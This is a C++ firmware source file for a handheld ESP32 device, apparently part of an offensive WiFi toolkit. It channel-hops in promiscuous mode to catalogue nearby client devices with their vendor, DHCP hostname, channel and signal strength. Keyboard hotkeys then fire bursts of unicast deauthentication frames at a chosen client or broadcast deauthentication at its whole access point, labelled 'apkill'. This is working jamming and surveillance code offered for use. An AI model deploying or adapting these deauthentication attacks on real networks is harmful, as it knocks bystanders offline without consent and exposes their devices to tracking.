/*
 * wifi_clients_all — global client hunter.
 *
 * Channel-hops 1-13 in promiscuous mode, sniffing every data frame.
 * Builds a table of (STA, BSSID) pairs with last-seen + RSSI + channel.
 * No pre-selection of an AP required.
 *
 * Hotkeys on selected client:
 *   D = deauth that one client only (unicast)
 *   X = broadcast deauth the whole AP this client is on
 *   L = lock to this client's channel (stop hopping)
 *   H = unlock / resume hopping
 */
#include "app.h"
#include "../theme.h"
#include "ui.h"
#include "input.h"
#include "radio.h"
#include "wifi_deauth_frame.h"
#include "ble_db.h"
#include "dhcp_cache.h"
#include <WiFi.h>
#include <esp_wifi.h>

#define MAX_ALL 64

struct acli_t {
    uint8_t  sta[6];
    uint8_t  bssid[6];
    int8_t   rssi;
    uint8_t  ch;
    uint32_t last_seen;
    uint32_t frames;
};

static acli_t s_all[MAX_ALL];
static volatile int      s_all_n  = 0;
static volatile uint8_t  s_all_ch = 1;
static volatile bool     s_running = false;
static volatile bool     s_locked  = false;

static int find_pair(const uint8_t *sta, const uint8_t *bssid)
{
    for (int i = 0; i < s_all_n; ++i) {
        if (memcmp(s_all[i].sta, sta, 6) == 0 &&
            memcmp(s_all[i].bssid, bssid, 6) == 0) return i;
    }
    return -1;
}

static void cb(void *buf, wifi_promiscuous_pkt_type_t type)
{
    if (type != WIFI_PKT_DATA) return;
    const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
    const uint8_t *p = pkt->payload;
    if (pkt->rx_ctrl.sig_len < 24) return;

    /* Try to learn a hostname from DHCP on open networks — cheap: bails
     * fast if the frame isn't DHCP. */
    dhcp_try_parse_802_11(p, pkt->rx_ctrl.sig_len);

    uint8_t fc = p[1];
    uint8_t from_ds = (fc >> 1) & 1;
    uint8_t to_ds   = (fc)      & 1;

    const uint8_t *bssid, *sta;
    if (to_ds && !from_ds)      { bssid = p + 4;  sta = p + 10; }
    else if (from_ds && !to_ds) { bssid = p + 10; sta = p + 4;  }
    else return;

    /* Reject broadcast or multicast stations. */
    if (sta[0] & 0x01) return;
    if (!memcmp(sta, bssid, 6)) return;

    int idx = find_pair(sta, bssid);
    if (idx < 0) {
        if (s_all_n >= MAX_ALL) {
            int oldest = 0;
            for (int i = 1; i < s_all_n; ++i)
                if (s_all[i].last_seen < s_all[oldest].last_seen) oldest = i;
            idx = oldest;
        } else {
            idx = s_all_n++;
        }
        memcpy(s_all[idx].sta,   sta,   6);
        memcpy(s_all[idx].bssid, bssid, 6);
        s_all[idx].frames = 0;
    }
    s_all[idx].rssi = pkt->rx_ctrl.rssi;
    s_all[idx].ch   = s_all_ch;
    s_all[idx].last_seen = millis();
    s_all[idx].frames++;
}

static void hop_task(void *)
{
    while (s_running) {
        if (!s_locked) {
            s_all_ch = (s_all_ch % 13) + 1;
            esp_wifi_set_channel(s_all_ch, WIFI_SECOND_CHAN_NONE);
        }
        delay(s_locked ? 200 : 400);
    }
    vTaskDelete(nullptr);
}

static uint16_t s_hot_seq = 0;

static void unicast_deauth(const uint8_t *sta, const uint8_t *bssid, uint8_t ch, int bursts)
{
    if (s_hot_seq == 0) s_hot_seq = (uint16_t)(esp_random() & 0x0FFF);
    /* Block the hopper for the duration of the burst so the channel
     * doesn't shift mid-attack. */
    bool prev_lock = s_locked;
    s_locked = true;
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    for (int i = 0; i < bursts; ++i) {
        wifi_deauth_pair(sta, bssid, &s_hot_seq);
        delay(5);
    }
    s_locked = prev_lock;
}

static void broadcast_deauth(const uint8_t *bssid, uint8_t ch, int bursts)
{
    if (s_hot_seq == 0) s_hot_seq = (uint16_t)(esp_random() & 0x0FFF);
    bool prev_lock = s_locked;
    s_locked = true;
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    for (int i = 0; i < bursts; ++i) {
        wifi_deauth_broadcast(bssid, &s_hot_seq);
        delay(5);
    }
    s_locked = prev_lock;
}

void feat_wifi_clients_all(void)
{
    radio_switch(RADIO_WIFI);
    WiFi.mode(WIFI_STA);

    s_all_n = 0;
    s_all_ch = 1;
    s_locked = false;
    s_running = true;

    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(cb);
    esp_wifi_set_channel(s_all_ch, WIFI_SECOND_CHAN_NONE);

    xTaskCreate(hop_task, "cli_hop", 3072, nullptr, 4, nullptr);

    int cursor = 0;
    ui_draw_footer(";/.=move D=dth X=apkill L=lock H=hop `=back");
    uint32_t last = 0;
    while (true) {
        if (millis() - last > 300) {
            last = millis();
            auto &d = M5Cardputer.Display;
            ui_clear_body();
            d.setTextColor(T_ACCENT, T_BG);
            d.setCursor(4, BODY_Y + 2);
            d.printf("CLIENTS  %d  ch%u%s",
                     s_all_n, s_all_ch, s_locked ? " LOCK" : "");
            d.drawFastHLine(4, BODY_Y + 12, SCR_W - 8, T_ACCENT);

            if (s_all_n == 0) {
                d.setTextColor(T_DIM, T_BG);
                d.setCursor(4, BODY_Y + 24);
                d.print("hopping all channels");
                d.setCursor(4, BODY_Y + 36);
                d.print("waiting for data frames...");
            } else {
                int rows = 8;
                if (cursor < 0) cursor = 0;
                if (cursor >= s_all_n) cursor = s_all_n - 1;
                int first = cursor - rows / 2;
                if (first < 0) first = 0;
                if (first + rows > s_all_n) first = max(0, s_all_n - rows);

                for (int r = 0; r < rows && first + r < s_all_n; ++r) {
                    const acli_t &c = s_all[first + r];
                    int y = BODY_Y + 18 + r * 10;
                    bool sel = (first + r == cursor);
                    if (sel) d.fillRect(0, y - 1, SCR_W, 10, 0x18C7);

                    uint32_t oui = ((uint32_t)c.sta[0] << 16) |
                                   ((uint32_t)c.sta[1] << 8)  |
                                    (uint32_t)c.sta[2];
                    const char *vendor   = ble_db_oui(oui);
                    const char *hostname = dhcp_hostname(c.sta);

                    /* Left column: hostname wins over vendor (more specific). */
                    uint16_t bg = sel ? 0x18C7 : T_BG;
                    if (hostname) {
                        d.setTextColor(sel ? T_ACCENT : T_GOOD, bg);
                        d.setCursor(2, y); d.printf("%-14.14s", hostname);
                    } else if (vendor) {
                        d.setTextColor(sel ? T_ACCENT : T_WARN, bg);
                        d.setCursor(2, y); d.printf("%-14.14s", vendor);
                    } else {
                        d.setTextColor(T_DIM, bg);
                        d.setCursor(2, y); d.printf("?");
                    }
                    d.setTextColor(sel ? T_ACCENT : T_FG, bg);
                    d.setCursor(88, y);
                    d.printf("%02X:%02X", c.sta[4], c.sta[5]);
                    d.setTextColor(T_DIM, bg);
                    d.setCursor(116, y);
                    d.printf("→%02X:%02X", c.bssid[4], c.bssid[5]);
                    d.setCursor(154, y); d.printf("ch%u", c.ch);
                    d.setTextColor(sel ? T_ACCENT : T_FG, bg);
                    d.setCursor(184, y); d.printf("%4d", c.rssi);
                }
            }
            ui_draw_status(radio_name(), s_locked ? "lock" : "hunt");
        }

        uint16_t k = input_poll();
        if (k == PK_NONE) { delay(20); continue; }
        if (k == PK_ESC) break;
        if (k == ';' || k == PK_UP)   { if (cursor > 0) cursor--; }
        if (k == '.' || k == PK_DOWN) { if (cursor + 1 < s_all_n) cursor++; }
        if (s_all_n == 0) continue;

        const acli_t &sel = s_all[cursor];
        if (k == 'd' || k == 'D') {
            unicast_deauth(sel.sta, sel.bssid, sel.ch, 30);
            ui_toast("deauth → STA", T_BAD, 500);
        } else if (k == 'x' || k == 'X') {
            broadcast_deauth(sel.bssid, sel.ch, 30);
            ui_toast("deauth AP all", T_BAD, 500);
        } else if (k == 'l' || k == 'L') {
            s_locked = true;
            s_all_ch = sel.ch;
            esp_wifi_set_channel(s_all_ch, WIFI_SECOND_CHAN_NONE);
            ui_toast("locked", T_WARN, 400);
        } else if (k == 'h' || k == 'H') {
            s_locked = false;
            ui_toast("hopping", T_GOOD, 400);
        }
    }

    s_running = false;
    esp_wifi_set_promiscuous(false);
    delay(150);
}
